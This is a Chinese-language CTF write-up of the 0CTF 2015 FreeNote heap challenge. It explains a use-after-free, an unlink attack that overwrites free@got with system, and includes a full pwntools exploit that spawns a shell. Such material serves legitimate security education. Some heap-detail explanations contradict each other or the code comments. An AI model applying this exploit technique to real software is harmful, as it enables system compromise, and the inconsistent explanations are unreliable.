# 漏洞成因
## 程序关键结构体
程序使用一个全局分配的数组（位于`qword_6020A8`指向的内存）来管理最多256个笔记条目。每个条目大小为24字节，结构如下：
```c
struct note_entry {
    uint64_t in_use;        // +0, 1表示使用中，0表示空闲
    uint64_t size;          // +8, 用户指定的笔记长度
    char* content_ptr;      // +16, 指向存储笔记内容的堆块指针
};
```
整个管理数组前16字节为头部信息：
- `*(qword_6020A8)`：最大笔记数量 (固定为256)
- `*(qword_6020A8 + 8)`：当前已使用的笔记数量

## 漏洞定位
1.  **Use-After-Free (UAF)**：在`sub_400F7D`（删除笔记）函数中，释放`content_ptr`后，仅将`in_use`标志置零，未将`content_ptr`指针清空。若后续通过其他操作（如`sub_400B14`列出笔记）访问该悬空指针，可导致信息泄露。
2.  **堆块管理缺陷**：程序分配内存时，使用`malloc((128 - v3 % 128) % 128 + v3)`，这确保分配的堆块大小（chunksize）是128字节的整数倍，并与用户指定长度`v3`相关。这影响了堆布局的策略。
3.  **realloc使用**：在`sub_400D87`（编辑笔记）函数中，若新长度与旧长度不同，会使用`realloc`调整堆块大小。这可以被利用来进行堆布局，例如扩展堆块以覆盖相邻空闲堆块的数据，为unlink攻击创造条件。

# 漏洞利用过程：
利用UAF泄露堆地址与libc地址，通过堆布局构造伪造的堆块，利用unlink攻击修改管理数组中的指针，从而获得一次任意地址写的机会，将`free@got`改写为`system`，最终通过删除一个内容为`/bin/sh`的笔记来触发`system("/bin/sh")`。

## Step 1~2
- 创建四个笔记（索引0,1,2,3），每个长度指定为1。根据分配规则，每个都会获得一个0x90（128+16对齐？实际为0x80 data + 0x10 header）大小的堆块（属于fastbin范围）。
- 删除索引0和索引2的笔记。这导致两个0x90大小的堆块被释放并加入fastbin。它们对应的`content_ptr`成为悬空指针，但`in_use`标志被清0。

## Step 3
- 创建两个新笔记（依次占用索引0和2的空位），长度均为8。`malloc`会从fastbin中取出最近释放的堆块（LIFO），因此：
  - 第一个`new(8)`会取到原索引2的堆块，并将其`content_ptr`指向该堆块的用户数据区（`fd`指针位置）。
  - 第二个`new(8)`会取到原索引0的堆块。

## Step 4~5
- 调用`list`功能。程序遍历所有笔记，对`in_use`为1的条目，打印其`content_ptr`指向的字符串。
- 由于索引0和2的`content_ptr`指向的是刚刚重新分配并写入`"12345678"`的堆块，打印正常。
- **关键泄露**：打印索引0的笔记时，其`content_ptr`指向的是第二次`new(8)`分配到的堆块（原索引0的堆块）。该堆块在作为fastbin时，其`fd`指针指向某个`main_arena`中的地址（因为fastbin单向链表）。`"12345678"`覆盖了`fd`指针的低8字节，但`fd`指针的高位地址仍保留在堆块中`"12345678"`之后的内存里。通过解析输出，可以计算出`libc`的基地址。
- 同时，打印索引2的笔记时，其`content_ptr`指向的是第一次`new(8)`分配到的堆块（原索引2的堆块）。该堆块可能包含指向堆管理结构或其他堆块的指针，通过解析可以计算出堆的基地址。

## Step 6
- 按顺序删除索引3,2,1,0的笔记。目的是清空所有笔记，为下一步复杂的堆布局做准备。此时，所有相关堆块（0x90大小）都回到了fastbin或即将被合并。

## Step 7
- 新建一个笔记，其内容`payload01`是一个精心构造的数据，旨在后续触发unlink攻击。
  - `p64(0) + p64(0x51)`：构造一个伪造的、大小为0x50的堆块头部（`prev_size`和`size`）。
  - `p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10)`：这是关键，伪造堆块的`fd`和`bk`指针，指向目标地址（管理数组中某个条目）的前后。这是为了通过unlink的`FD->bk = BK`和`BK->fd = FD`机制，向目标地址写入一个可控值（这里是`heap + 0x30`）。
  - `b'A'*0x30 + p64(0x50) + p64(0x20)`：填充数据，并设置下一个堆块的`prev_size`和`size`，其中`size`的`PREV_INUSE`位为0，表示前一个堆块是“空闲”的，这是触发向后合并（unlink）的条件。

## Step 8
- 新建第二个笔记，内容为`payload02`，目的是布置一个大的堆块，并设置其大小和标志位，使得在Step 9释放特定堆块时，glibc的堆管理器认为它应该与Step 7中伪造的“空闲”堆块进行合并（backward consolidation），从而触发对伪造堆块的unlink操作。

## Step 9
- 删除索引为2的笔记。这个笔记对应的堆块紧邻Step 7中伪造的“空闲”堆块。由于伪造堆块的`size`中`PREV_INUSE`位为0，且`prev_size`字段被正确设置，`free`会尝试将当前释放的堆块与之前的“空闲”堆块合并。合并过程会检查伪造“空闲”堆块是否在双向链表中（通过`fd`和`bk`指针），并执行unlink操作。
- **unlink攻击生效**：unlink宏执行`FD->bk = BK`和`BK->fd = FD`。这里`FD`=`heap + 0x30 - 0x18`，`BK`=`heap + 0x30 - 0x10`。因此，最终向`FD->bk`即`(heap + 0x30 - 0x18) + 0x18 = heap + 0x30`写入`BK`的值`heap + 0x30 - 0x10`；同时向`BK->fd`即`(heap + 0x30 - 0x10) + 0x10 = heap + 0x30`写入`FD`的值`heap + 0x30 - 0x18`。实际上，这导致`heap + 0x30`处的值被覆盖为`heap + 0x30 - 0x18`。
- `heap + 0x30`这个地址恰好是管理数组中索引0笔记的`content_ptr`（`qword_6020A8 + 24*0 + 32`）所处的位置。因此，现在索引0笔记的`content_ptr`指向了`heap + 0x30 - 0x18`，即管理数组内部的一个地址。

## Step 10
- 编辑索引0的笔记。由于它的`content_ptr`现在指向管理数组内部，这次编辑操作可以**覆写管理数组本身**。
- `payload03`被写入：
  - `p64(8) + p64(0x1) + p64(0x8)`：这覆盖了索引0笔记条目自身的`in_use`, `size`, `content_ptr`。将`content_ptr`设置为`free@got`的地址。
  - `p64(free_got)`：这就是上一步设置的`content_ptr`新值。
  - `b'A'*0x40`：填充。
- 现在，索引0笔记的`content_ptr`指向了`free@got`。

## Step 11
- 再次编辑索引0的笔记。由于`content_ptr`已指向`free@got`，这次写入会将数据直接写到`free@got`。
- `payload04 = p64(system)`：将`free@got`的值覆盖为`system`函数的地址。

## Step 12~14
- 新建一个笔记，内容为`"/bin/sh\x00"`。
- 删除这个笔记。程序会调用`free(其content_ptr)`，但由于`free@got`已被改为`system`，实际执行的是`system("/bin/sh")`。
- 获得shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./data/bin/heap23_10_0CTF_2015_FreeNote')
elf = ELF('./data/bin/heap23_10_0CTF_2015_FreeNote')
libc = elf.libc

def list():
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')

def new(length, note):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'new note: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'note: ')
    p.send(note)

def edit(index, length, note):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Note number: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Length of note: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'Enter your note: ')
    p.send(note)

def delete(index):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'4')
    p.recvuntil(b'Note number: ')
    p.sendline(str(index).encode())

def exit():
    p.recvuntil(b'Your choice: ')
    p.sendline(b'5')

# Step 1: Create 4 notes to populate the heap
new(1, b'a');new(1, b'a');new(1, b'a');new(1, b'a')
# Step 2: Free notes 0 and 2 to get dangling pointers
delete(0);delete(2)
# Step 3: Reallocate them. Due to fastbin LIFO, index 2 gets the old chunk of index2, index 0 gets the old chunk of index0.
new(8, b'12345678');new(8, b'12345678')
# Step 4 & 5: Leak heap and libc addresses by listing notes
list()
p.recvuntil(b'0. 12345678')
# Parse heap address from the output of note 0 (which uses the old index0 chunk)
heap = u64(p.recvline().strip(b'\x0a').ljust(8, b'\x00')) - 0x1940
p.recvuntil(b'2. 12345678')
# Parse libc address from the output of note 2 (which uses the old index2 chunk)
libcbase = u64(p.recvline().strip(b'\x0a').ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58)
libc.address = libcbase
log.success(f"heap base: {hex(heap)}")
log.success(f"libc base: {hex(libc.address)}")

# Step 6: Clean up all notes
delete(3);delete(2);delete(1);delete(0)

# Step 7: Create a note with a fake free chunk inside, preparing for unlink
payload01  = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10) + b'A'*0x30 + p64(0x50) + p64(0x20)
new(len(payload01), payload01)

# Step 8: Create another note to set up heap layout for triggering consolidation
payload02  = b'A'*0x80 + p64(0x110) + p64(0x90) + b'A'*0x80 + p64(0) + p64(0x71) + b'A'*0x60
new(len(payload02), payload02)

# Step 9: Trigger unlink by freeing the adjacent chunk. This will overwrite the content_ptr of note 0.
delete(2)

# Step 10: Now note 0's content_ptr points inside the note table. Overwrite it to point to free@got.
free_got = elf.got['free']
system = libc.symbols['system']
payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + b'A'*0x40
edit(0, 0x60, payload03)

# Step 11: Overwrite free@got with system address
payload04 = p64(system)
edit(0, 0x8, payload04)

# Step 12 & 13: Create a note with "/bin/sh" and then "free" it, which now calls system("/bin/sh")
payload05 = b'/bin/sh\x00'
new(len(payload05), payload05)
delete(4)

# Step 14: Enjoy shell
p.interactive()
```
